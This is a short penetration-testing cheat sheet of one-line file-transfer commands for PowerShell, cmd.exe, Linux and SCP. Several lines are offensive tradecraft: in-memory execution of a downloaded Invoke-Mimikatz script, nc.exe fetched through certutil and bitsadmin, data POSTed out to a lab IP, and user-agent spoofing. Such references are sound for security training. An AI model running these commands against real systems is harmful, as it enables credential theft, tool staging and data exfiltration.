# FILE TRANSFERS

## PowerShell

- **[Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)**: Download a file with PowerShell.
- **[IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/everything-about-expressions?view=powershell-7.2)**: Execute a file in memory using PowerShell.
- **[Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)**: Upload a file with PowerShell.

## Windows Command Line (cmd.exe)

- **[bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin)**: Download a file using Bitsadmin.
- **[certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)**: Download a file using Certutil.

## Linux / Unix

- **[wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh](https://linux.die.net/man/1/wget)**: Download a file using Wget.
- **[curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://linux.die.net/man/1/curl)**: Download a file using cURL.
- **[php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'](https://www.php.net/manual/en/function.file-get-contents.php)**: Download a file using PHP.

## SCP (Secure Copy Protocol)

- **[scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip](https://linux.die.net/man/1/scp)**: Upload a file using SCP.
- **[scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe](https://linux.die.net/man/1/scp)**: Download a file using SCP.

## Invoke-WebRequest with User Agent

- **[Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)**: Invoke-WebRequest using a Chrome User Agent.
